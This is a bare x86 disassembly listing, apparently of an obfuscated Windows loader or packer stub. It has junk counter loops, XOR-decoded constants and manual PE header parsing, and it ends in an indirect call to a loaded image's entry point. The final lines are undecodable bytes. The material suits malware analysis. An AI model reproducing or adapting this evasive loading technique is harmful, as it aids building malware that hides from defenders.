  40890b:	mov    edx,DWORD PTR ds:0x44a6e8
  408911:	dec    edx
  408912:	mov    DWORD PTR ds:0x44a6e8,edx
  408918:	jmp    0x4088cc
  40891d:	and    DWORD PTR ds:0x41073f,0x0
  408927:	jmp    0x40893b
  40892c:	xor    edx,edx
  40892e:	xor    edx,DWORD PTR ds:0x41073f
  408934:	inc    edx
  408935:	mov    DWORD PTR ds:0x41073f,edx
  40893b:	cmp    DWORD PTR ds:0x41073f,0x11
  408942:	jae    0x408985
  408948:	cmp    DWORD PTR ds:0x41073f,0x7
  40894f:	jne    0x40895e
  408955:	push   DWORD PTR [ebp-0xc]
  408958:	call   DWORD PTR ds:0x442394
  40895e:	cmp    DWORD PTR ds:0x41073f,0x6
  408965:	jne    0x40897a
  40896b:	xor    edx,edx
  40896d:	or     edx,DWORD PTR ds:0x41073f
  408973:	inc    edx
  408974:	mov    DWORD PTR ds:0x41073f,edx
  40897a:	jmp    0x40892c
  40897f:	xor    DWORD PTR ds:0x4479a8,ebx
  408985:	mov    eax,DWORD PTR [eax+0x198]
  40898b:	mov    DWORD PTR [ebp-0x8],eax
  40898e:	or     DWORD PTR ds:0x4479a4,0xc15
  408998:	mov    eax,DWORD PTR [ebp-0x1c]
  40899b:	mov    edx,DWORD PTR [ebp-0x8]
  40899e:	xor    ebx,0x1805
  4089a4:	xor    eax,esi
  4089a6:	dec    ebx
  4089a7:	add    eax,edi
  4089a9:	sbb    ebx,DWORD PTR ds:0x41074f
  4089af:	mov    DWORD PTR [edx],eax
  4089b1:	add    ebx,DWORD PTR ds:0x44a6d4
  4089b7:	lea    eax,[ebp-0x10]
  4089ba:	dec    ebx
  4089bb:	mov    DWORD PTR [ebp-0x34],eax
  4089be:	and    DWORD PTR ds:0x410757,0x0
  4089c8:	jmp    0x4089db
  4089cd:	xor    eax,eax
  4089cf:	or     eax,DWORD PTR ds:0x410757
  4089d5:	inc    eax
  4089d6:	mov    ds:0x410757,eax
  4089db:	cmp    DWORD PTR ds:0x410757,0x13
  4089e2:	jae    0x408a35
  4089e8:	cmp    DWORD PTR ds:0x410757,0x6
  4089ef:	jne    0x408a0d
  4089f5:	push   0x1b4e
  4089fa:	push   0x76a9
  4089ff:	push   DWORD PTR [ebp-0x1c]
  408a02:	push   0x886b
  408a07:	call   DWORD PTR ds:0x442398
  408a0d:	cmp    DWORD PTR ds:0x410757,0x5
  408a14:	jne    0x408a25
  408a1a:	mov    eax,ds:0x410757
  408a1f:	inc    eax
  408a20:	mov    ds:0x410757,eax
  408a25:	jmp    0x4089cd
  408a2a:	mov    eax,ds:0x44a6dc
  408a2f:	and    DWORD PTR ds:0x424732,eax
  408a35:	mov    eax,DWORD PTR [ebp-0x1c]
  408a38:	adc    edx,0x330f
  408a3e:	mov    edx,DWORD PTR [ebp-0x34]
  408a41:	sub    DWORD PTR ds:0x41074b,ebx
  408a47:	xor    eax,esi
  408a49:	mov    DWORD PTR ds:0x447980,0x18
  408a53:	cmp    DWORD PTR ds:0x447980,0x0
  408a5a:	je     0x408b05
  408a60:	cmp    DWORD PTR ds:0x447980,0x2
  408a67:	jne    0x408a82
  408a6d:	push   DWORD PTR [ebp-0x28]
  408a70:	push   DWORD PTR [ebp-0x20]
  408a73:	push   DWORD PTR [ebp-0x10]
  408a76:	push   DWORD PTR [ebp-0x1c]
  408a79:	push   DWORD PTR [ebp-0x28]
  408a7c:	call   DWORD PTR ds:0x4420fc
  408a82:	cmp    DWORD PTR ds:0x447980,0x3
  408a89:	jne    0x408a9e
  408a8f:	xor    ebx,ebx
  408a91:	xor    ebx,DWORD PTR ds:0x447980
  408a97:	dec    ebx
  408a98:	mov    DWORD PTR ds:0x447980,ebx
  408a9e:	xor    ebx,ebx
  408aa0:	add    ebx,DWORD PTR ds:0x447980
  408aa6:	dec    ebx
  408aa7:	mov    DWORD PTR ds:0x447980,ebx
  408aad:	jmp    0x408a53
  408ab2:	and    DWORD PTR ds:0x42472e,0x0
  408abc:	jmp    0x408ace
  408ac1:	mov    ebx,DWORD PTR ds:0x42472e
  408ac7:	inc    ebx
  408ac8:	mov    DWORD PTR ds:0x42472e,ebx
  408ace:	cmp    DWORD PTR ds:0x42472e,0x10
  408ad5:	jae    0x408b05
  408adb:	cmp    DWORD PTR ds:0x42472e,0x19
  408ae2:	jne    0x408af3
  408ae8:	push   0x82d5
  408aed:	call   DWORD PTR ds:0x442100
  408af3:	jmp    0x408ac1
  408af8:	movzx  ebx,WORD PTR ds:0x410757
  408aff:	and    DWORD PTR ds:0x4479a8,ebx
  408b05:	add    eax,edi
  408b07:	adc    DWORD PTR ds:0x42473a,0x6c9f
  408b11:	mov    DWORD PTR [edx],eax
  408b13:	mov    DWORD PTR [ebp-0x2c],ecx
  408b16:	lea    eax,[ebp-0x2c]
  408b19:	or     ebx,ebx
  408b1b:	mov    DWORD PTR [ebp-0x14],eax
  408b1e:	add    ebx,eax
  408b20:	mov    eax,DWORD PTR [ebp-0x2c]
  408b23:	sub    ebx,0x4e67
  408b29:	mov    ecx,DWORD PTR [ebp-0x14]
  408b2c:	xor    eax,esi
  408b2e:	adc    ebx,0x2698
  408b34:	add    eax,0x32729e
  408b39:	and    DWORD PTR ds:0x424742,0x0
  408b43:	mov    ebx,DWORD PTR ds:0x424742
  408b49:	inc    ebx
  408b4a:	mov    DWORD PTR ds:0x424742,ebx
  408b50:	cmp    DWORD PTR ds:0x424742,0xb
  408b57:	jne    0x408b68
  408b5d:	push   0x410870
  408b62:	call   DWORD PTR ds:0x442104
  408b68:	cmp    DWORD PTR ds:0x424742,0xa
  408b6f:	jne    0x408b82
  408b75:	mov    ebx,DWORD PTR ds:0x424742
  408b7b:	inc    ebx
  408b7c:	mov    DWORD PTR ds:0x424742,ebx
  408b82:	cmp    DWORD PTR ds:0x424742,0x19
  408b89:	jb     0x408b43
  408b8f:	adc    ebx,DWORD PTR ds:0x41074b
  408b95:	mov    DWORD PTR [ecx],eax
  408b97:	sub    DWORD PTR ds:0x44a6dc,0x6b19
  408ba1:	mov    eax,ds:0x444274
  408ba6:	sbb    ebx,0x4548
  408bac:	mov    DWORD PTR [ebp-0x24],0x8e12febe
  408bb3:	xor    DWORD PTR ds:0x447998,edx
  408bb9:	mov    eax,DWORD PTR [eax]
  408bbb:	xor    DWORD PTR ds:0x44a6d0,ebx
  408bc1:	mov    cx,WORD PTR [ebp-0x10]
  408bc5:	movzx  ecx,cx
  408bc8:	xor    ebx,DWORD PTR ds:0x410757
  408bce:	add    ecx,DWORD PTR [eax]
  408bd0:	mov    DWORD PTR [ebp-0x40],0xf89c8531
  408bd7:	mov    ebx,DWORD PTR ds:0x447994
  408bdd:	sub    DWORD PTR ds:0x44a6e0,ebx
  408be3:	mov    DWORD PTR [ebp-0x14],ecx
  408be6:	xor    ebx,ebx
  408be8:	mov    ebx,0x5a3fc9e
  408bed:	and    DWORD PTR ds:0x44798c,0x0
  408bf7:	mov    ecx,DWORD PTR ds:0x44798c
  408bfd:	inc    ecx
  408bfe:	mov    DWORD PTR ds:0x44798c,ecx
  408c04:	cmp    DWORD PTR ds:0x44798c,0x7
  408c0b:	jne    0x408c36
  408c11:	push   0x7083
  408c16:	push   0x1db3
  408c1b:	push   0x7eea
  408c20:	push   0x447984
  408c25:	push   DWORD PTR [ebp-0x14]
  408c28:	push   DWORD PTR [ebp-0x24]
  408c2b:	push   0x41089f
  408c30:	call   DWORD PTR ds:0x44239c
  408c36:	cmp    DWORD PTR ds:0x44798c,0x6
  408c3d:	jne    0x408c50
  408c43:	mov    ecx,DWORD PTR ds:0x44798c
  408c49:	inc    ecx
  408c4a:	mov    DWORD PTR ds:0x44798c,ecx
  408c50:	cmp    DWORD PTR ds:0x44798c,0x10
  408c57:	jb     0x408bf7
  408c5d:	mov    eax,DWORD PTR [ebp-0x1c]
  408c60:	mov    ecx,DWORD PTR [ebp-0x8]
  408c63:	xor    eax,esi
  408c65:	add    eax,edi
  408c67:	mov    DWORD PTR ds:0x410757,0x128d
  408c71:	cmp    DWORD PTR [ecx],eax
  408c73:	mov    DWORD PTR ds:0x42473e,0x2c74
  408c7d:	jne    0x408de6
  408c83:	movzx  eax,BYTE PTR ds:0x410747
  408c8a:	adc    eax,DWORD PTR ds:0x410753
  408c90:	mov    ds:0x410747,eax
  408c95:	mov    eax,DWORD PTR [ebp-0x1c]
  408c98:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9b:	or     DWORD PTR ds:0x44d424,0x44d420
  408ca5:	xor    eax,esi
  408ca7:	or     DWORD PTR ds:0x447988,0x44d428
  408cb1:	add    eax,edi
  408cb3:	mov    DWORD PTR ds:0x44799c,0x2417
  408cbd:	cmp    DWORD PTR [ecx],eax
  408cbf:	jne    0x408d21
  408cc5:	dec    edx
  408cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  408cc9:	sbb    DWORD PTR ds:0x44d424,0x7bb6
  408cd3:	mov    ecx,DWORD PTR [ebp-0x34]
  408cd6:	adc    DWORD PTR ds:0x447990,ecx
  408cdc:	xor    eax,esi
  408cde:	xor    DWORD PTR ds:0x44d420,0x6611
  408ce8:	add    eax,edi
  408cea:	movzx  edx,WORD PTR ds:0x42472a
  408cf1:	sbb    DWORD PTR ds:0x424732,edx
  408cf7:	mov    DWORD PTR [ecx],eax
  408cf9:	dec    ecx
  408cfa:	mov    eax,DWORD PTR [ebp-0x34]
  408cfd:	mov    ecx,DWORD PTR [ebp-0x40]
  408d00:	sbb    edx,DWORD PTR ds:0x44d420
  408d06:	xor    ecx,esi
  408d08:	adc    edx,DWORD PTR ds:0x4479a8
  408d0e:	mov    edx,0xffcd8d62
  408d13:	sbb    DWORD PTR ds:0x447984,0x447980
  408d1d:	sub    edx,ecx
  408d1f:	add    DWORD PTR [eax],edx
  408d21:	mov    DWORD PTR ds:0x410747,0x19
  408d2b:	cmp    DWORD PTR ds:0x410747,0x0
  408d32:	je     0x408d8e
  408d38:	cmp    DWORD PTR ds:0x410747,0x5
  408d3f:	jne    0x408d63
  408d45:	push   DWORD PTR [ebp-0x1c]
  408d48:	push   0x2684
  408d4d:	push   DWORD PTR [ebp-0x18]
  408d50:	push   DWORD PTR [ebp-0x28]
  408d53:	push   0x71f6
  408d58:	push   0x2f24
  408d5d:	call   DWORD PTR ds:0x4423a0
  408d63:	cmp    DWORD PTR ds:0x410747,0x6
  408d6a:	jne    0x408d7b
  408d70:	mov    eax,ds:0x410747
  408d75:	dec    eax
  408d76:	mov    ds:0x410747,eax
  408d7b:	xor    eax,eax
  408d7d:	or     eax,DWORD PTR ds:0x410747
  408d83:	dec    eax
  408d84:	mov    ds:0x410747,eax
  408d89:	jmp    0x408d2b
  408d8e:	mov    eax,ds:0x444274
  408d93:	mov    eax,DWORD PTR [eax]
  408d95:	mov    cx,WORD PTR [ebp-0x10]
  408d99:	movzx  ecx,cx
  408d9c:	add    ecx,DWORD PTR [eax]
  408d9e:	mov    DWORD PTR [ebp-0x14],ecx
  408da1:	mov    eax,DWORD PTR [ebp-0x28]
  408da4:	mov    ecx,DWORD PTR [ebp-0x28]
  408da7:	xor    eax,esi
  408da9:	lea    eax,[eax+eax*1+0x32729e]
  408db0:	xor    ecx,esi
  408db2:	sub    ecx,eax
  408db4:	mov    ax,WORD PTR [ebp-0x10]
  408db8:	movzx  eax,ax
  408dbb:	cmp    eax,ecx
  408dbd:	mov    eax,DWORD PTR [ebp-0x40]
  408dc0:	movzx  ecx,WORD PTR [ebp-0x10]
  408dc4:	jg     0x408dd9
  408dca:	xor    eax,esi
  408dcc:	sub    ecx,eax
  408dce:	sub    ecx,edi
  408dd0:	mov    WORD PTR [ebp-0x10],cx
  408dd4:	jmp    0x408de6
  408dd9:	xor    eax,esi
  408ddb:	lea    eax,[eax+ecx*1+0x32729e]
  408de2:	mov    WORD PTR [ebp-0x10],ax
  408de6:	mov    ecx,DWORD PTR [ebp-0x24]
  408de9:	mov    eax,0x8e12febe
  408dee:	cmp    ecx,eax
  408df0:	je     0x408e04
  408df6:	mov    eax,DWORD PTR [ebp-0x8]
  408df9:	mov    DWORD PTR [eax],0x60341e8d
  408dff:	jmp    0x40902a
  408e04:	mov    ecx,DWORD PTR [ebp-0x24]
  408e07:	cmp    ecx,0x5142ddbc
  408e0d:	jne    0x408e85
  408e13:	mov    eax,DWORD PTR [ebp-0x8]
  408e16:	mov    DWORD PTR [eax],0x4214febc
  408e1c:	mov    eax,DWORD PTR [ebp-0x8]
  408e1f:	mov    DWORD PTR [ebp-0xc],eax
  408e22:	mov    eax,DWORD PTR [ebp-0x28]
  408e25:	mov    eax,DWORD PTR [ebp-0x1c]
  408e28:	mov    DWORD PTR [ebp-0x3c],ebx
  408e2b:	mov    eax,DWORD PTR [ebp-0x3c]
  408e2e:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408e35:	cmp    eax,ebx
  408e37:	jne    0x40902a
  408e3d:	mov    ax,WORD PTR [ebp-0x4]
  408e41:	mov    ecx,0x8a42
  408e46:	xor    ax,cx
  408e49:	mov    ecx,0x3b08
  408e4e:	add    ax,cx
  408e51:	mov    ecx,DWORD PTR [ebp-0xc]
  408e54:	movzx  eax,ax
  408e57:	not    eax
  408e59:	and    eax,DWORD PTR [ecx]
  408e5b:	mov    ecx,DWORD PTR [ebp-0xc]
  408e5e:	mov    DWORD PTR [ecx],eax
  408e60:	jmp    0x408e6c
  408e65:	xor    DWORD PTR [ebp-0x3c],0xe149ebe
  408e6c:	mov    ax,WORD PTR [ebp-0x4]
  408e70:	push   DWORD PTR [ebp-0xc]
  408e73:	call   0x407112
  408e78:	test   eax,eax
  408e7a:	je     0x408e65
  408e80:	jmp    0x40902a
  408e85:	mov    ecx,DWORD PTR [ebp-0x24]
  408e88:	cmp    ecx,0x1443fcbd
  408e8e:	jne    0x408ea2
  408e94:	mov    eax,DWORD PTR [ebp-0x8]
  408e97:	mov    DWORD PTR [eax],0x60062d8f
  408e9d:	jmp    0x40902a
  408ea2:	mov    ecx,DWORD PTR [ebp-0x24]
  408ea5:	cmp    ecx,eax
  408ea7:	jne    0x408faf
  408ead:	mov    eax,DWORD PTR [ebp-0x1c]
  408eb0:	mov    ecx,DWORD PTR [ebp-0x8]
  408eb3:	xor    eax,esi
  408eb5:	add    eax,edi
  408eb7:	cmp    DWORD PTR [ecx],eax
  408eb9:	je     0x408f3c
  408ebf:	mov    ecx,DWORD PTR [ebp-0x2c]
  408ec2:	mov    eax,DWORD PTR [ebp-0x8]
  408ec5:	mov    eax,DWORD PTR [eax]
  408ec7:	mov    eax,DWORD PTR [eax+0x3c]
  408eca:	lea    ecx,[ecx*8+0x78]
  408ed1:	add    eax,ecx
  408ed3:	mov    ecx,DWORD PTR [ebp-0x8]
  408ed6:	mov    ecx,DWORD PTR [ecx]
  408ed8:	mov    eax,DWORD PTR [eax+ecx*1]
  408edb:	mov    DWORD PTR [ebp-0x4],eax
  408ede:	mov    eax,DWORD PTR [ebp-0x1c]
  408ee1:	xor    eax,esi
  408ee3:	add    eax,edi
  408ee5:	mov    DWORD PTR [ebp-0xc],eax
  408ee8:	mov    eax,DWORD PTR [ebp-0x1c]
  408eeb:	mov    ecx,DWORD PTR [ebp-0x4]
  408eee:	xor    eax,esi
  408ef0:	add    eax,edi
  408ef2:	cmp    ecx,eax
  408ef4:	je     0x40902a
  408efa:	mov    eax,DWORD PTR [ebp-0x8]
  408efd:	mov    ecx,DWORD PTR [ebp-0x4]
  408f00:	add    ecx,DWORD PTR [eax]
  408f02:	mov    DWORD PTR [ebp-0xc],ecx
  408f05:	mov    eax,DWORD PTR [ebp-0xc]
  408f08:	mov    ecx,DWORD PTR [ebp-0x8]
  408f0b:	mov    eax,DWORD PTR [eax+0xc]
  408f0e:	mov    ecx,DWORD PTR [ecx]
  408f10:	mov    al,BYTE PTR [eax+ecx*1]
  408f13:	add    al,0x35
  408f15:	xor    al,0x49
  408f17:	cmp    al,0xc9
  408f19:	je     0x408f30
  408f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f22:	mov    ecx,DWORD PTR [ebp-0x8]
  408f25:	xor    eax,esi
  408f27:	add    eax,edi
  408f29:	mov    DWORD PTR [ecx],eax
  408f2b:	jmp    0x40902a
  408f30:	xor    DWORD PTR [ebp-0x24],0x5fd8f
  408f37:	jmp    0x40902a
  408f3c:	mov    eax,DWORD PTR [ebp-0x8]
  408f3f:	mov    ecx,DWORD PTR [ebp-0x14]
  408f42:	mov    ecx,DWORD PTR [ecx]
  408f44:	mov    DWORD PTR [eax],ecx
  408f46:	mov    eax,DWORD PTR [ebp-0x8]
  408f49:	mov    DWORD PTR [ebp-0xc],eax
  408f4c:	mov    eax,DWORD PTR [ebp-0x28]
  408f4f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f52:	mov    DWORD PTR [ebp-0x44],ebx
  408f55:	mov    eax,DWORD PTR [ebp-0x44]
  408f58:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408f5f:	cmp    eax,ebx
  408f61:	jne    0x40902a
  408f67:	mov    ax,WORD PTR [ebp-0x4]
  408f6b:	mov    ecx,0x8a42
  408f70:	xor    ax,cx
  408f73:	mov    ecx,0x3b08
  408f78:	add    ax,cx
  408f7b:	mov    ecx,DWORD PTR [ebp-0xc]
  408f7e:	movzx  eax,ax
  408f81:	not    eax
  408f83:	and    eax,DWORD PTR [ecx]
  408f85:	mov    ecx,DWORD PTR [ebp-0xc]
  408f88:	mov    DWORD PTR [ecx],eax
  408f8a:	jmp    0x408f96
  408f8f:	xor    DWORD PTR [ebp-0x44],0xe149ebe
  408f96:	mov    ax,WORD PTR [ebp-0x4]
  408f9a:	push   DWORD PTR [ebp-0xc]
  408f9d:	call   0x407112
  408fa2:	test   eax,eax
  408fa4:	je     0x408f8f
  408faa:	jmp    0x40902a
  408faf:	mov    eax,DWORD PTR [ebp-0x24]
  408fb2:	cmp    eax,0x33450cad
  408fb7:	jne    0x40902a
  408fbd:	mov    eax,DWORD PTR [ebp-0x8]
  408fc0:	mov    DWORD PTR [eax],0x443dc9d
  408fc6:	mov    eax,DWORD PTR [ebp-0x8]
  408fc9:	mov    DWORD PTR [ebp-0xc],eax
  408fcc:	mov    eax,DWORD PTR [ebp-0x28]
  408fcf:	mov    eax,DWORD PTR [ebp-0x1c]
  408fd2:	mov    DWORD PTR [ebp-0x38],ebx
  408fd5:	mov    eax,DWORD PTR [ebp-0x38]
  408fd8:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408fdf:	cmp    eax,ebx
  408fe1:	jne    0x40902a
  408fe7:	mov    ax,WORD PTR [ebp-0x4]
  408feb:	mov    ecx,0x8a42
  408ff0:	xor    ax,cx
  408ff3:	mov    ecx,0x3b08
  408ff8:	add    ax,cx
  408ffb:	mov    ecx,DWORD PTR [ebp-0xc]
  408ffe:	movzx  eax,ax
  409001:	not    eax
  409003:	and    eax,DWORD PTR [ecx]
  409005:	mov    ecx,DWORD PTR [ebp-0xc]
  409008:	mov    DWORD PTR [ecx],eax
  40900a:	jmp    0x409016
  40900f:	xor    DWORD PTR [ebp-0x38],0xe149ebe
  409016:	mov    ax,WORD PTR [ebp-0x4]
  40901a:	push   DWORD PTR [ebp-0xc]
  40901d:	call   0x407112
  409022:	test   eax,eax
  409024:	je     0x40900f
  40902a:	mov    eax,DWORD PTR [ebp-0x24]
  40902d:	cmp    eax,0x8e12febe
  409032:	je     0x408bed
  409038:	mov    eax,DWORD PTR [ebp-0x8]
  40903b:	mov    eax,ds:0x4441a0
  409040:	mov    eax,DWORD PTR [eax+0x18c]
  409046:	mov    eax,DWORD PTR [eax]
  409048:	mov    DWORD PTR [ebp-0x58],eax
  40904b:	mov    eax,0xf89c8531
  409050:	mov    DWORD PTR [ebp-0x14],eax
  409053:	mov    DWORD PTR [ebp-0x14],eax
  409056:	mov    DWORD PTR [ebp-0x14],eax
  409059:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  409060:	mov    DWORD PTR [ebp-0x4],eax
  409063:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  40906a:	mov    ebx,DWORD PTR [ebp-0x20]
  40906d:	xor    ebx,esi
  40906f:	add    ebx,edi
  409071:	jmp    0x4090ac
  409076:	mov    eax,DWORD PTR [ebp-0x18]
  409079:	xor    eax,esi
  40907b:	lea    eax,[eax+ebx*1+0x32729e]
  409082:	push   eax
  409083:	mov    eax,DWORD PTR [ebp-0x14]
  409086:	xor    eax,esi
  409088:	lea    eax,[ebp+eax*1+0x3272a6]
  40908f:	push   eax
  409090:	mov    eax,ds:0x4441a0
  409095:	push   DWORD PTR [eax+0x1bc]
  40909b:	call   0x402c35
  4090a0:	mov    eax,DWORD PTR [ebp-0x18]
  4090a3:	xor    eax,esi
  4090a5:	lea    ebx,[ebx+eax*1+0x32729e]
  4090ac:	mov    eax,DWORD PTR [ebp-0x18]
  4090af:	mov    ecx,DWORD PTR [ebp-0x18]
  4090b2:	xor    ecx,esi
  4090b4:	xor    eax,esi
  4090b6:	add    eax,ecx
  4090b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4090bb:	xor    ecx,esi
  4090bd:	lea    eax,[eax+ecx*1+0x9757da]
  4090c4:	cmp    ebx,eax
  4090c6:	jbe    0x409076
  4090cc:	mov    eax,DWORD PTR [ebp+0xc]
  4090cf:	mov    ds:0x444024,eax
  4090d4:	mov    eax,DWORD PTR [ebp+0x10]
  4090d7:	mov    ds:0x444278,eax
  4090dc:	mov    eax,ds:0x444024
  4090e1:	mov    ecx,DWORD PTR [ebp-0x30]
  4090e4:	sub    eax,edi
  4090e6:	xor    eax,esi
  4090e8:	mov    DWORD PTR [ecx],eax
  4090ea:	mov    eax,DWORD PTR [ebp-0x4c]
  4090ed:	cmp    eax,0xf89c8534
  4090f2:	je     0x40914f
  4090f8:	mov    eax,DWORD PTR [ebp-0x20]
  4090fb:	mov    ecx,DWORD PTR [ebp-0x54]
  4090fe:	xor    eax,esi
  409100:	add    eax,edi
  409102:	cmp    eax,ecx
  409104:	je     0x40914f
  40910a:	mov    eax,ds:0x4441a0
  40910f:	mov    eax,DWORD PTR [eax+0x194]
  409115:	mov    ecx,DWORD PTR [eax]
  409117:	mov    eax,DWORD PTR [ecx+0x3c]
  40911a:	push   DWORD PTR ds:0x444278
  409120:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409124:	push   DWORD PTR ds:0x444024
  40912a:	add    eax,ecx
  40912c:	mov    ecx,DWORD PTR ds:0x4441a0
  409132:	mov    ecx,DWORD PTR [ecx+0x194]
  409138:	push   DWORD PTR [ecx]
  40913a:	call   eax
  40913c:	mov    ecx,DWORD PTR ds:0x4441a0
  409142:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409148:	mov    DWORD PTR [ecx],eax
  40914a:	jmp    0x409276
  40914f:	mov    eax,DWORD PTR [ebp-0x20]
  409152:	mov    ecx,DWORD PTR [ebp-0x58]
  409155:	xor    eax,esi
  409157:	add    eax,edi
  409159:	cmp    eax,ecx
  40915b:	jne    0x409259
  409161:	mov    eax,DWORD PTR [ebp-0x20]
  409164:	xor    eax,esi
  409166:	add    eax,edi
  409168:	mov    ds:0x444224,eax
  40916d:	mov    eax,DWORD PTR [ebp-0x20]
  409170:	xor    eax,esi
  409172:	add    eax,edi
  409174:	mov    ds:0x44421c,eax
  409179:	mov    eax,DWORD PTR [ebp-0x18]
  40917c:	mov    DWORD PTR [ebp-0x14],eax
  40917f:	mov    eax,DWORD PTR [ebp-0x20]
  409182:	mov    DWORD PTR [ebp+0xc],eax
  409185:	mov    eax,DWORD PTR [ebp+0xc]
  409188:	xor    eax,esi
  40918a:	add    eax,edi
  40918c:	mov    DWORD PTR [ebp+0xc],eax
  40918f:	mov    eax,ds:0x444020
  409194:	mov    eax,DWORD PTR [eax]
  409196:	mov    DWORD PTR [ebp+0xc],eax
  409199:	mov    eax,ds:0x444228
  40919e:	mov    eax,DWORD PTR [eax]
  4091a0:	mov    DWORD PTR [ebp-0x30],eax
  4091a3:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  4091aa:	mov    eax,DWORD PTR [ebp+0x10]
  4091ad:	xor    eax,esi
  4091af:	add    eax,edi
  4091b1:	mov    DWORD PTR [ebp+0x10],eax
  4091b4:	mov    eax,ds:0x4441a0
  4091b9:	mov    DWORD PTR [ebp+0x10],eax
  4091bc:	mov    eax,DWORD PTR [ebp+0xc]
  4091bf:	mov    DWORD PTR [ebp+0xc],eax
  4091c2:	mov    eax,DWORD PTR [ebp+0xc]
  4091c5:	push   0x4
  4091c7:	pop    ecx
  4091c8:	sub    ecx,eax
  4091ca:	add    ecx,DWORD PTR [ebp-0x30]
  4091cd:	mov    DWORD PTR [ebp-0x4],0xf89c85f5
  4091d4:	mov    DWORD PTR [ebp+0x10],ecx
  4091d7:	mov    DWORD PTR [ebp-0xa0],0xf89c8531
  4091e1:	mov    eax,DWORD PTR [ebp+0xc]
  4091e4:	mov    DWORD PTR [ebp-0x9c],eax
  4091ea:	mov    eax,DWORD PTR [ebp+0x10]
  4091ed:	mov    DWORD PTR [ebp-0x98],eax
  4091f3:	mov    eax,DWORD PTR [ebp-0x4]
  4091f6:	xor    eax,esi
  4091f8:	add    eax,edi
  4091fa:	mov    DWORD PTR [ebp-0x94],eax
  409200:	lea    eax,[ebp-0x5c]
  409203:	mov    DWORD PTR [ebp-0x90],eax
  409209:	mov    eax,DWORD PTR [ebp-0xa0]
  40920f:	xor    eax,esi
  409211:	add    eax,edi
  409213:	mov    DWORD PTR [ebp-0xa0],eax
  409219:	lea    eax,[ebp-0xa0]
  40921f:	push   eax
  409220:	mov    eax,DWORD PTR [ebp-0x14]
  409223:	xor    eax,esi
  409225:	add    eax,edi
  409227:	push   eax
  409228:	mov    eax,ds:0x4441c0
  40922d:	push   0x444116
  409232:	push   DWORD PTR [eax]
  409234:	call   0x40101c
  409239:	xor    esi,esi
  40923b:	mov    eax,DWORD PTR [ebp+0x10]
  40923e:	sub    eax,esi
  409240:	push   eax
  409241:	mov    eax,DWORD PTR [ebp+0xc]
  409244:	add    eax,esi
  409246:	push   eax
  409247:	call   0x40354e
  40924c:	inc    esi
  40924d:	cmp    esi,0x52
  409250:	jb     0x40923b
  409256:	mov    eax,DWORD PTR [ebp-0x14]
  409259:	call   0x405b6e
  40925e:	lea    eax,[ebp+0x4]
  409261:	mov    DWORD PTR [ebp-0x50],eax
  409264:	mov    eax,DWORD PTR [ebp-0x48]
  409267:	mov    eax,DWORD PTR [ebp-0x18]
  40926a:	push   DWORD PTR [ebp-0x20]
  40926d:	lea    eax,[ebp-0x50]
  409270:	push   eax
  409271:	call   0x40324f
  409276:	mov    eax,ds:0x4441a0
  40927b:	push   0x4
  40927d:	add    eax,0x1cc
  409282:	push   eax
  409283:	lea    eax,[ebp-0x48]
  409286:	push   eax
  409287:	call   0x402c35
  40928c:	mov    eax,DWORD PTR [ebp-0x48]
  40928f:	mov    eax,DWORD PTR [eax]
  409291:	pop    edi
  409292:	pop    ebx
  409293:	pop    esi
  409294:	leave  
  409295:	ret    0xc
  409298:	push   ebp
  409299:	mov    ebp,esp
  40929b:	sub    esp,0x58
  40929e:	add    eax,ecx
  4092a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4092a3:	sub    eax,DWORD PTR ds:0x447988
  4092a9:	mov    eax,0x8a42
  4092ae:	add    DWORD PTR ds:0x410753,0x424732
  4092b8:	xor    ax,WORD PTR [ecx+0x20]
  4092bc:	and    DWORD PTR ds:0x447990,0x0
  4092c6:	mov    ecx,DWORD PTR ds:0x447990
  4092cc:	inc    ecx
  4092cd:	mov    DWORD PTR ds:0x447990,ecx
  4092d3:	cmp    DWORD PTR ds:0x447990,0x9
  4092da:	jne    0x4092f3
  4092e0:	push   DWORD PTR [ebp-0x28]
  4092e3:	push   0x44799c
  4092e8:	push   0x55d9
  4092ed:	call   DWORD PTR ds:0x4423a4
  4092f3:	cmp    DWORD PTR ds:0x447990,0x8
  4092fa:	jne    0x40930d
  409300:	mov    ecx,DWORD PTR ds:0x447990
  409306:	inc    ecx
  409307:	mov    DWORD PTR ds:0x447990,ecx
  40930d:	cmp    DWORD PTR ds:0x447990,0x14
  409314:	jb     0x4092c6
  40931a:	mov    ecx,0x3b08
  40931f:	add    ax,cx
  409322:	movzx  eax,ax
  409325:	sub    ecx,0x7afe
  40932b:	mov    DWORD PTR [ebp-0xc],eax
  40932e:	mov    BYTE PTR [ebp-0x1],0x7f
  409332:	lea    eax,[ebp-0x1]
  409335:	mov    DWORD PTR [ebp-0x10],eax
  409338:	and    ecx,0x503
  40933e:	jmp    0x409494
  409343:	mov    ?,ebx
  409345:	icebp  
  409346:	test   al,0x85
  409348:	stos   BYTE PTR es:[edi],al
  409349:	mov    ebp,0xef32abd
  40934e:	cmp    eax,0x5b1d7eb0
  409353:	(bad)  
  409357:	daa    
  409358:	jg     0x4093d6
  40935a:	jl     0x409327
  40935c:	cmp    BYTE PTR [ebx+0x50],cl
  40935f:	or     BYTE PTR [esi+0x31ced1eb],dl
  409365:	sub    bl,al
  409367:	xor    ch,BYTE PTR [eax+0x7848800e]
  40936d:	dec    eax
  40936e:	push   edi
  40936f:	xchg   DWORD PTR [eax+eax*4],esp
  409372:	int    0x13
  409374:	int    0xfa
  409376:	adc    esi,eax
  409378:	push   cs
  409379:	push   cs
  40937a:	mov    gs:0x89cea8bb,eax
  409380:	dec    edx
  409381:	push   ecx
  409382:	mov    ch,0xcf
  409384:	icebp  
  409385:	mov    ecx,0x3492c774
  40938a:	and    BYTE PTR [edi-0x13bb6619],dl
  409390:	cmp    BYTE PTR [ecx-0x49],cl
  409393:	fimul  WORD PTR [ebx+0x20]
  409396:	pop    edx
  409397:	packssdw mm0,QWORD PTR [ecx]
